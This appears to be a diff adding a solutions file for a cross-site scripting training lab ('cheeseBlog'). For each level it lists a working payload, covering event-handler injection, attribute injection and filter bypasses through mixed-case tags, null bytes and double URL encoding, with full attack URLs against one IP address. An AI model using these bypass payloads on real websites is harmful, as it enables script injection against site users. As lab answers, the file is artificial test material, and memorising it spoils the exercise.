@@ -1,0 +1,44 @@
+cheeseBlog-1  Basic reflected XSS on search page
+Solution:
+
+cheeseBlog-2  filtered reflected XSS on search page
+Solution: <img src=x onmouseover=confirm()>
+
+cheeseBlog-3  html tag injection into input
+Solution: ' onmouseover=alert() '
+
+cheeseBlog-4 almost everything except onclick is blocked
+Solution: <img src=x onclick=confirm()>
+
+cheeseBlog-11 The first 10 characters, it filters <
+Solution: gdfhhgjhgjnhgjhgjghj<img src=x onclick=confirm()>
+
+cheeseBlog-12 This is really hard, there is a hidden input field on the category page. This is vulnerabile to attribute injection
+Solution: ' accesskey=X onclick=alert(1) ' in the title field
+Then you need to go to categories and press alt+shift+x
+You can only have this ONES on the page and it only works in FF. You can break all the code after it but people will start noticing. x='
+
+cheeseBlog-13
+You need to do directory brute forcing to find images.php
+There you need to enter the following attack vector; <img src=x onclick=confirm()>
+This is because alert is blocked
+
+cheeseBlog-14
+A lot is filtered here
+- You need a nullbyte SOMEWHERE in the payload (%00)
+- No img tags BUT this is filtered BEFORE the lowercasing AND I am also filtering Img so you need to use iMg tag
+
+- it will convert the search query to lowercase string
+
+All of this is filtered AFTER toLowerCase
+- no SVG allowed
+- No scripts
+- No alert
+- No confirm
+http://23.239.9.22/cheeseBlog-14/search.php?q=fdsfniose0dffdsfsdffds%3CiMg%2500src%3Dx%2500onerror%3Dprompt%28%29%3E
+
+cheeseBlog-15
+You will need double encoding here http://23.239.9.22/cheeseBlog-15/search.php?q=%25253cimg+src%3Dx%3E
+%25 url decodes into %
+%3c into <
+%3e in >
